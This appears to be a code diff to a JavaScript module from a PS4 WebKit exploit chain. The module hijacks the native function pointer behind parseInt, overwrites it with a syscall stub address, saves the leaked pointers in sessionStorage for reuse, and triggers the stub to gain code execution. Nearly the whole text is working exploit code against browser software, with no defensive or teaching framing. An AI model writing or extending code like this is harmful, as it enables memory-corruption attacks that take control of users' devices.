@@ -2,7 +2,6 @@
  * Direct stub entry — NO G0-G5 slab. Step logs + flush before each dangerous op.
  */
 import { int64 } from "./int64.js";
-import { getCoreNative } from "./core.js?v=stub-core-3";
 
 const COLLATOR_OFF = 0x18;
 const ARENA_BYTES = 0x1000;
@@ -10,27 +9,87 @@ const FAKE_UC = 0x100;
 const FAKE_VT = 0x300;
 const MARK_OFF = 0xf00;
 const SS_LAST = "wk-stub-last-step";
+const SS_CAP = "wk-stub-cap";
+const CORE_NATIVE_SS = "wk-core-native";
 const JSFUNC_EXECUTABLE_OFF = 0x18;
 
 function codeLooksNative(code4) {
     return code4 != null && code4 !== 0 && code4 !== 0xffffffff && code4 !== 0xcccccccc;
 }
 
+function parseStoredHex(v) {
+    if (v == null) return NaN;
+    if (typeof v === "number" && Number.isFinite(v)) return v;
+    if (typeof v === "string") {
+        const s = v.replace(/^0x/i, "").trim();
+        if (!s || !/^[0-9a-f]+$/i.test(s)) return NaN;
+        if (s.length <= 8) return parseInt(s, 16) >>> 0;
+        const lo = parseInt(s.slice(-8), 16) >>> 0;
+        const hi = parseInt(s.slice(0, -8), 16) >>> 0;
+        return lo + hi * 0x100000000;
+    }
+    return NaN;
+}
+
+function ptrToHex(p) {
+    if (!p) return "";
+    return String(p);
+}
+
+function nativeAnchorsFromCarrier(carrier) {
+    const src = (carrier && carrier.native) ? carrier.native : null;
+    if (src) {
+        const exec = parseStoredHex(src.executable);
+        const tc = parseStoredHex(src.targetCell);
+        const fn = parseStoredHex(src.nativeFn);
+        if (Number.isFinite(exec) && Number.isFinite(tc) && Number.isFinite(fn))
+            return { executable: exec, targetCell: tc, nativeFn: fn, _src: "carrier" };
+    }
+    try {
+        const raw = sessionStorage.getItem(CORE_NATIVE_SS);
+        if (!raw) return null;
+        const j = JSON.parse(raw);
+        const exec = parseStoredHex(j.executable);
+        const tc = parseStoredHex(j.targetCell);
+        const fn = parseStoredHex(j.nativeFn);
+        if (Number.isFinite(exec) && Number.isFinite(tc) && Number.isFinite(fn))
+            return { executable: exec, targetCell: tc, nativeFn: fn, _src: "session" };
+    } catch (_) { }
+    return null;
+}
+
+function persistStubCap(cap) {
+    try {
+        sessionStorage.setItem(SS_CAP, JSON.stringify({
+            mainMf: ptrToHex(cap.mainMf),
+            mainOrig: ptrToHex(cap.mainOrig),
+            path: cap.path || "",
+            t: Date.now(),
+        }));
+    } catch (_) { }
+}
+
+function loadStubCap() {
+    try {
+        const raw = sessionStorage.getItem(SS_CAP);
+        if (!raw) return null;
+        const j = JSON.parse(raw);
+        const mainMf = numToI64(j.mainMf);
+        const mainOrig = numToI64(j.mainOrig);
+        if (!mainMf || !mainOrig) return null;
+        return { mainMf, mainOrig, nativeFn: mainOrig, path: j.path || "session-cap" };
+    } catch (_) {
+        return null;
+    }
+}
+
 function numToI64(n) {
     if (n == null) return null;
     if (typeof n === "object" && n != null && "low" in n)
         return new int64(n.low >>> 0, (n.hi >>> 0));
-    if (typeof n === "string") {
-        const s = n.replace(/^0x/i, "").trim();
-        if (!s || !/^[0-9a-f]+$/i.test(s)) return null;
-        if (s.length <= 8) return new int64(parseInt(s, 16) >>> 0, 0);
-        if (s.length < 16) return new int64(parseInt(s.slice(-8), 16) >>> 0, 0);
-        return new int64(
-            parseInt(s.slice(-8), 16) >>> 0,
-            parseInt(s.slice(0, -8), 16) >>> 0);
-    }
-    if (!Number.isFinite(n) || n <= 0) return null;
-    return new int64(n >>> 0, Math.floor(n / 0x100000000) >>> 0);
+    const num = parseStoredHex(n);
+    if (!Number.isFinite(num) || num <= 0) return null;
+    return new int64(num >>> 0, Math.floor(num / 0x100000000) >>> 0);
 }
 
 /** PS4 webkit fn ptr — 0x80–0x8f module range; don't require read4 probe. */
@@ -87,7 +146,7 @@ export function captureParseIntMainMf(p, off, opts) {
         || (typeof window !== "undefined" ? window._wkCarrier : null);
     const mOff = off.wk_JSFunction_m_function || 0x28;
 
-    const nat = getCoreNative(carrier);
+    const nat = nativeAnchorsFromCarrier(carrier);
     if (nat) {
         const exec = numToI64(nat.executable);
         const tc = numToI64(nat.targetCell);
@@ -188,8 +247,22 @@ export function fireStubSwapParseInt(p, off, lk, opts) {
     opts = opts || {};
     const { step } = stubCtx(opts);
     const carrier = opts.carrier || (typeof window !== "undefined" ? window._wkCarrier : null);
-    const cap = captureParseIntMainMf(p, off, opts);
-    const stubs = resolveGetpidStub(lk, off, opts.stubKind || "all");
+
+    let cap = opts.reuseCap || null;
+    if (!cap && opts.reuseCap !== false)
+        cap = loadStubCap();
+    if (!cap) {
+        if (opts.preTrim) {
+            try { opts.preTrim(); step("STUB-TRIM", "ok"); } catch (te) {
+                step("STUB-TRIM-WARN", te.message || String(te));
+            }
+        }
+        cap = captureParseIntMainMf(p, off, opts);
+    } else {
+        step("STUB-CAP-REUSE", "mainMf=" + cap.mainMf + " path=" + (cap.path || "?"));
+    }
+
+    const stubs = resolveGetpidStub(lk, off, opts.stubKind || "syscall");
     const stub = stubs[opts.stubIdx != null ? opts.stubIdx : 0];
 
     let fireArg;
@@ -197,7 +270,7 @@ export function fireStubSwapParseInt(p, off, lk, opts) {
     if (opts.arg !== undefined) {
         fireArg = opts.arg;
         argLabel = "custom";
-    } else if (opts.useTextarea !== false && carrier && carrier.textarea) {
+    } else if (opts.useTextarea === true && carrier && carrier.textarea) {
         fireArg = carrier.textarea;
         argLabel = "textarea";
     } else {
@@ -212,14 +285,27 @@ export function fireStubSwapParseInt(p, off, lk, opts) {
     if (!armed || String(armed) !== String(stub.addr))
         throw new Error("stub: arm write did not stick");
 
-    if (opts.armOnly)
-        return { path: "stub-arm-only", stub: stub.addr, stubTag: stub.tag, mainMf: cap.mainMf, armed: true };
+    if (opts.armOnly) {
+        p.write8(cap.mainMf, cap.mainOrig);
+        step("STUB-ARM-RESTORE", "mainMf restored — parseInt safe");
+        persistStubCap(cap);
+        if (typeof window !== "undefined") window._stubCap = cap;
+        return {
+            path: "stub-arm-only",
+            stub: stub.addr,
+            stubTag: stub.tag,
+            mainMf: cap.mainMf,
+            mainOrig: cap.mainOrig,
+            armed: true,
+        };
+    }
 
-    step("STUB-FIRE", "parseInt(" + argLabel + ") — OOM/crash past here = entered stub");
+    step("STUB-FIRE", "parseInt(" + argLabel + ") — tab death past here = entered stub");
     let result = NaN;
     let err = null;
+    const trigger = opts.pivotFn || parseInt;
     try {
-        result = parseInt(fireArg);
+        result = trigger(fireArg);
     } catch (e) {
         err = e;
     } finally {
